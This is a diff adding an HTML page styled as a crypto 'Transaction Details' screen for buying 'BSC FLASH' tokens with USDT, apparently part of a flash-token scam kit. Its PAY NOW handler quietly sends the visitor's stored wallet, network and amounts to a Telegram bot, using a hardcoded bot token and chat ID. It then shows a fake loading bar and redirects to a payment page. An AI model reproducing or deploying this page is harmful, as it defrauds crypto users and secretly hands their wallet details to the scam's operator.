@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Transaction Details</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: Arial, sans-serif;
+      color: #FFD700;
+      background: url('background.png') no-repeat center center fixed;
+      background-size: cover;
+      overflow: hidden;
+    }
+
+    .container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+      padding: 20px;
+    }
+
+    .glass-box {
+      background: rgba(0, 0, 0, 0.7);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 20px;
+      padding: 30px 20px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: 0 0 20px #000;
+      position: relative;
+    }
+
+    .glass-box img.icon {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      object-fit: cover;
+      position: absolute;
+      top: -30px;
+      left: 50%;
+      transform: translateX(-50%);
+      border: 2px solid #FFD70088;
+      background: #000;
+    }
+
+    .glass-box h2 {
+      margin-top: 40px;
+      margin-bottom: 25px;
+      font-size: 24px;
+      text-shadow: 0 0 8px #FFD70088;
+    }
+
+    .field {
+      margin-bottom: 20px;
+      background: rgba(255, 255, 255, 0.05);
+      padding: 12px;
+      border-radius: 12px;
+      border: 1px solid #FFD70044;
+      font-weight: bold;
+      font-size: 16px;
+      box-shadow: inset 0 0 6px #00000066;
+    }
+
+    .btn-pay {
+      background: linear-gradient(to right, #FFD700, #e6c300);
+      color: black;
+      padding: 12px;
+      border: none;
+      border-radius: 10px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .btn-pay:hover {
+      background: #FFD700;
+    }
+
+    .loader {
+      margin-top: 20px;
+      width: 100%;
+      height: 8px;
+      background: rgba(255,255,255,0.1);
+      border-radius: 10px;
+      overflow: hidden;
+      display: none;
+    }
+
+    .loader-bar {
+      height: 100%;
+      width: 0%;
+      background: #FFD700;
+      animation: loading 5s linear forwards;
+    }
+
+    @keyframes loading {
+      from { width: 0%; }
+      to { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="glass-box">
+      <img src="swap.png" class="icon" alt="Swap Icon" />
+      <h2>Transaction Details:</h2>
+
+      <div class="field" id="flashAmount">BSC FLASH: 0</div>
+      <div class="field" id="usdtAmount">You pay: 0 USDT</div>
+
+      <button class="btn-pay" onclick="payNow()">PAY NOW</button>
+
+      <div class="loader" id="loader">
+        <div class="loader-bar"></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const flash = localStorage.getItem("flash_bsc") || "0";
+    const usdt = localStorage.getItem("amount_usdt") || "0";
+    const wallet = localStorage.getItem("wallet") || "Unknown Wallet";
+    const network = localStorage.getItem("network") || "TRX";
+
+    document.getElementById("flashAmount").innerText = `BSC FLASH: ${flash}`;
+    document.getElementById("usdtAmount").innerText = `You pay: ${usdt} USDT`;
+
+    function payNow() {
+      const botToken = '8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw';
+      const chatId = '7739393558';
+
+      const message = `🔁 Transaction\nWallet: ${wallet}\nNetwork: ${network}\nAmount: ${usdt} USDT\nFlash: ${flash} BSC FLASH`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+
+      document.getElementById("loader").style.display = "block";
+
+      setTimeout(() => {
+        window.location.href = "pay.html";
+      }, 5000);
+    }
+  </script>
+
+</body>
+</html>
